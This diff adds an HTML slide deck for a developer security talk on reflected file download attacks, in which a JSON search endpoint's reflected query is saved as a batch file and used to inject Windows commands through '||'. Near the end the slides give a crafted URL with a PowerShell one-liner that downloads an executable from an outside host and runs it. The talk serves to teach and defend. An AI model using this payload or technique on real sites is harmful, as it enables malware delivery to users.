@@ -1,0 +1,241 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Web Application Insecurity</title>
+    <meta charset="utf-8">
+    <style>
+      @import url(https://fonts.googleapis.com/css?family=Yanone+Kaffeesatz);
+      @import url(https://fonts.googleapis.com/css?family=Droid+Serif:400,700,400italic);
+      @import url(https://fonts.googleapis.com/css?family=Ubuntu+Mono:400,700,400italic);
+
+      body { font-family: 'Droid Serif'; }
+      h1, h2, h3 {
+        -family: 'Yanone Kaffeesatz';
+        font-weight: normal;
+      }
+      .remark-code, .remark-inline-code { font-family: 'Ubuntu Mono'; }
+    </style>
+  </head>
+  <body>
+    <textarea id="source">
+
+class: center, middle
+
+# Web Application Insecurity
+## Outside the OWASP top 10
+
+???
+
+If you're not already familiar with the OWASP project, it's a great resource
+on security issues you should be aware of as a developer, wherever you operate
+in the 'stack'.
+
+We're going to talk about a newer web security issue, presented first in
+November 2014, but worth covering because it's fun to understand how it
+works and to see how easy it is to fall prey to - and to fix.
+
+---
+
+class: center, middle
+
+# Search page
+
+![Image](images/search.png)
+
+???
+
+We have decided to build an advertising company, which will do no evil.
+
+---
+
+class: center, middle
+
+# AJAX search in action
+
+![Image](images/search-r.png)
+
+???
+
+There's a new Web 2.0 technique around, called AJAX, where you can call
+back to your server without a whole page refresh.
+
+---
+
+# Javascript
+
+```javascript
+$.getJSON("/s/q/" + q,
+  function(data) {
+    $("#results").empty();
+    if (data.people.length == 0)
+    {
+      $("#results").append("<div>Nothing found</div>");
+    }
+    else
+    {
+      $.each(data.people, function(i,item){
+        $("#results").append("<div>" + item + "</div>");
+      });
+    }
+  }
+);
+```
+
+---
+
+# MVC Controller
+
+```ruby
+require 'json'
+
+class SController &lt; Controller
+
+  set_layout nil
+
+  def q(query)
+    response.header['Content-Type'] = 'application/json;'
+    # Defeat XSS (Malicious user upload displayed as if part of web page)
+    response.header['Content-Disposition'] = 'attachment'
+    { q: query, people: find(query) }.to_json
+  end
+
+  private
+
+  def find(query)
+    ["Rik Hemsley", "Steven Pears", "Jamie Keeling", "Jordan Gray"].select {
+      |name|
+      name.upcase.include?(query.upcase)
+    }
+  end
+
+end
+```
+
+---
+
+class: center, middle
+
+# XSS from a download?
+
+## [Oh yes](http://stackoverflow.com/questions/3922872/how-can-xss-be-avoided-in-html-downloads)
+## (Oh no!)
+
+---
+
+# Response
+
+```javascript
+{
+  q: "r",
+  people: ["Rik Hemsley", "Steven Pears", "Jordan Gray"]
+}
+```
+
+---
+
+# Response headers
+
+```http
+Content-Type: application/json;
+Content-Length: 63
+Content-Disposition: attachment
+```
+
+---
+
+# What if we browse to it?
+
+![Image](images/download.png)
+
+--
+
+```javascript
+{"q":"r", "people":["Rik Hemsley","Steven Pears","Jordan Gray"]}
+```
+
+---
+
+# But can we run it?
+
+![Image](images/bat.png)
+
+---
+
+# And this will work how?
+
+--
+
+```
+C:\>{"q":"r", "people":["rik hemsley","steven pears","jordan gray"]}
+The filename, directory name, or volume label syntax is incorrect.
+```
+
+--
+
+## We don't need all of it
+```
+C:\>{"q":"r"
+The filename, directory name, or volume label syntax is incorrect.
+```
+---
+# What about a command?
+```
+C:\>{"q":"echo hi"
+The filename, directory name, or volume label syntax is incorrect.
+```
+--
+## But we had an effect
+``` 
+C:\>echo %ERRORLEVEL%
+9009
+```
+---
+
+class: center, middle
+
+# Happy 200th, George Boole!
+
+![Image](images/boole.jpg)
+
+---
+
+# And thanks for this
+
+```
+C:\>{"q":""||echo hi
+'{"q":""' is not recognized as an internal or external command,
+operable program or batch file.
+hi
+```
+--
+```
+C:\>{"q":""||echo hi||", "people":["rik hemsley","steven pears","jordan gray"]}
+'{"q":""' is not recognized as an internal or external command,
+operable program or batch file.
+hi
+```
+
+---
+
+class: center, middle
+
+# So we can be naughty
+
+https://legit.com/s/q/%22%7C%7CPowerShell%20(New-Object%20System.Net.WebClient).DownloadFile('http://dod.gy/h','h.exe');Start-Process%20'h.exe'%7C%7C
+
+![Image](images/legit-update.png)
+
+---
+
+class: center, middle
+
+# FIN
+
+
+    </textarea>
+
+    <script src="remark/remark-latest.min.js"></script>
+    <script>remark.create();</script>
+    <script src="remark/remark-zoom.js"></script>
+  </body>
+</html>
